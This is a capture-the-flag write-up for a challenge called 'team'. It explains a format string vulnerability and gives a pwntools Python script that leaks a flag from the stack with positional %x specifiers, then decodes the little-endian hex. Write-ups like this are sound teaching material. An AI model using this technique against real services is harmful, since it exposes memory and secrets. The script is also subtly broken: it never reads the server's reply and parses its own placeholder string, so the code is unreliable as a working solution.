# team 600pts 

##Overview
To start, disassembling the program reveals a format string
vulnerability when it prints the team name.
After much trial and error and not doing anything right at all,
I noticed that using many %x.%x.%x.%x.....%x would essentially 
dump the stack for you. Because I had a poor flag locally,
(a flag.txt file is needed in the same directory to do this chal)
that wasn't extrememly noticable, it took me a long time to realize
the flag was being dumped to the terminal. It was just in little/big 
endian (don't remember which is which) and hex. So copy the values 
from the output, reverse each byte, convert to ascii and you've got 
the flag. 

By observing where your flag was located in the outputted data, you 
could see the flag began 10 words from the beginning of the dump. 
Therefore, using %10$x would cause the 10th value on the stack to be 
printed or the first word of the flag. We now can hardcode exactly 
where the flag will be. The flag is printed in hex, there are 256 
bits in the flag (i.e. 32 bytes or 64 hex characters) so we will 
need to use 16 %x's to grab the entire flag. 

##Code
Import pwn tools, set the context appropriately and connect to 
the remote service. If this is being run on a linux computer, 
it will work locally if in the same directory as the team
executable. Note there also needs to be a flag file locally. 
Pwn tools will run the process and attach it to a port, 
simulating the contest environment quite nicely.
```python
from pwn import *
context(arch='i386', os='linux')

# Challenge originally hosted at hack.bckdr.in 8004
if 'HOST' in args:
    r = remote(args['HOST'], int(args['PORT']))
else:
    l = listen(0)
    l.spawn_process(['./team'])
    r = remote('localhost', l.lport)
```
Next we construct a teamname that will display the 16 words off the stack
that contain the flag. We send this as the teamname and can then 
send anything as the flag.
```python
teamname = "%10$x.%11$x.%12$x.%13$x.%14$x.%15$x.%16$x.%17$x.%18$x.%19$x.%20$x.%21$x.%22$x.%23$x.%24$x.%25$x"

flag = "Doesn't matter"

r.recvuntil("Enter teamname:")

print "[*] Sending teamname"
r.send(teamname + "\n")

r.recvuntil("Enter flag:")
print "[*] Sending flag"
r.send(flag + "\n")
```
We then receive the data containing the flag and 
strip away the unnecessary parts.
```python
f = flag.replace(" ", "").replace(":", "").split(".")
```
The values are backwards on the stack due to
endianness. We can use pwntools' p32() here 
to get the flag values. 
We could optionally 
hex decode the string and then invert it like
so: ```flag += str(i.decode("hex")[::-1])```
but I like pwntools so we'll use that.
```python
flag = ""
for i in f:
	flag += str(p32(int(i, 16)))

print "[*] Flag: " + flag
# RyanAiden
```
